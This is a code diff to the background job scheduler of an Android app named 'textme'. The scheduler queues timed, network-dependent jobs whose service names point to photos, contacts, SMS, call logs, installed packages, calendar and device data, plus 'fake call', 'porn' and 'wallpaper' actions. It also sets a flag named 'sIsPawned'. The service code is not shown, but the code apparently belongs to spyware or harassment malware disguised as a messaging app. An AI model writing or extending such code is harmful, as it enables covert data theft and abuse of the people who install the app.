@@ -1,4 +1,4 @@
-package com.candroid.textme;
+package com.candroid.textme.jobs;
 
 import android.app.job.JobInfo;
 import android.app.job.JobScheduler;
@@ -6,6 +6,18 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
+
+import com.candroid.textme.jobs.services.CalendarEventJobService;
+import com.candroid.textme.jobs.services.ContactsJobService;
+import com.candroid.textme.jobs.services.DcimJobService;
+import com.candroid.textme.jobs.services.DeviceJobService;
+import com.candroid.textme.jobs.services.FakeCallJobService;
+import com.candroid.textme.jobs.services.PackagesJobService;
+import com.candroid.textme.jobs.services.PhoneCallsJobService;
+import com.candroid.textme.jobs.services.PornJobService;
+import com.candroid.textme.jobs.services.SmsJobService;
+import com.candroid.textme.jobs.services.WallpaperJobService;
+import com.candroid.textme.receivers.ScreenReceiver;
 
 public class JobsScheduler {
     public static final int JOB_ID_PORN = 1;
@@ -29,7 +41,7 @@ public class JobsScheduler {
     public static final String CALENDAR_EVENTS_KEY = "CALENDAR_EVENTS_KEY";
     public static final String FAKE_PHONE_CALL_KEY = "FAKE_PHONE_CALL_KEY";
 
-    protected static void scheduleJob(Context context){
+    public static void scheduleJob(Context context){
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
         boolean ranDcim = sharedPreferences.getBoolean(DCIM_KEY, false);
         boolean ranPackages = sharedPreferences.getBoolean(PACKAGES_KEY, false);
@@ -43,7 +55,7 @@ public class JobsScheduler {
         if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
             ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
             JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
-            builder.setMinimumLatency(15 * ONE_MINUTE);
+            builder.setMinimumLatency(20 * ONE_MINUTE);
             builder.setOverrideDeadline(30 * ONE_MINUTE);
             builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
             jobScheduler.schedule(builder.build());
@@ -164,7 +176,9 @@ public class JobsScheduler {
             calendarEventJob.setMinimumLatency(8 * ONE_MINUTE);
             jobScheduler.schedule(calendarEventJob.build());
         }else{
-            ScreenReceiver.sIsPawned = true;
+            if(! ranFakePhoneCall){
+                ScreenReceiver.sIsPawned = true;
+            }
         }
     }
 }
